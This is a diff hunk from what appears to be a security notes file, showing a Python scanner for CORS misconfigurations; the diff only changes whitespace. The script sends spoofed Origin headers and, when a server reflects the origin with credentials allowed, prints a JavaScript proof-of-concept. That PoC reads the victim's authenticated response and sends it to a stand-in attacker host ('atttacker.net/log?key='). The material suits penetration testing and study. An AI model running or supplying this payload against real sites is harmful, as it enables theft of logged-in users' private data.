@@ -67,54 +67,50 @@ Origin: 'http://xxx.xxe.sh .payload'
 
 ```python
 #python3
-
 import requests
 import re
 import sys
 
 if len(sys.argv) < 2:
-    print("requires a url parameter.")
-    sys.exit(0)
+    print("requires a url parameter.")
+    sys.exit(0)
 else:
-    url = sys.argv[1]
+    url = sys.argv[1]
 
 def CheckCORS(url):
-    domain = re.search(r"https?://([\w.-]+)/", url)
-    domain = domain.group(1)
-    payload = ['https://'+domain+'.test.com','http://'+domain+'.test.com','https://'+domain+' .test.com','https://'+domain+'_.test.com','null','https://www.test.com','http://www.test.com']
-
-    POC = """
-    var req = new XMLHttpRequest();  
-    req.onload = reqListener;  
-    req.open('get','"""+url+"""',true);  
-    req.withCredentials = true;  
-    req.send();  
-    function reqListener() {  
-        location='//atttacker.net/log?key='+this.responseText;  
-    };
-    """
-    
-    for i in range(len(payload)):
-        try:
-            headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
-            "Origin": payload[i]
-            }
-            response = requests.get(url,headers=headers)
-            acao_headers = response.headers['Access-Control-Allow-Origin']
-            acac_headers = response.headers['Access-Control-Allow-Credentials']
-            
-            if (acao_headers == payload[i] or  acao_headers == '*') and acac_headers == "true":
-                print("{} has a CORS vulnerability.".format(url))
-                print("try to use poc:\n {}".format(POC))
-                print("change hosts file to: 127.0.0.1  {}\nand put POC HTML file in HTTP Server.".format(payload[i]))
-                break
-                return url
-        except:
-            pass
-
+    domain = re.search(r"https?://([\w.-]+)/", url)
+    domain = domain.group(1)
+    payload = ['https://'+domain+'.test.com','http://'+domain+'.test.com','https://'+domain+' .test.com','https://'+domain+'_.test.com','null','https://www.test.com','http://www.test.com']
+    POC = """
+	var req = new XMLHttpRequest();  
+	req.onload = reqListener;  
+	req.open('get','"""+url+"""',true);  
+	req.withCredentials = true;  
+	req.send();  
   
+	function reqListener() {  
+	    location='//atttacker.net/log?key='+this.responseText;  
+	};
+	"""
+    for i in range(len(payload)):
+        try:
+            headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
+            "Origin": payload[i]
+            }
+            response = requests.get(url,headers=headers)
+            acao_headers = response.headers['Access-Control-Allow-Origin']
+            acac_headers = response.headers['Access-Control-Allow-Credentials']
+            if (acao_headers == payload[i] or  acao_headers == '*') and acac_headers == "true":
+                print("{} has a CORS vulnerability.".format(url))
+                print("try to use poc:\n {}".format(POC))
+                print("change hosts file to: 127.0.0.1  {}\nand put POC HTML file in HTTP Server.".format(payload[i]))
+                break
+                return url
+        except:
+            pass
 
 if __name__ == "__main__":
-    CheckCORS(url)
+    CheckCORS(url)
+    
 ```
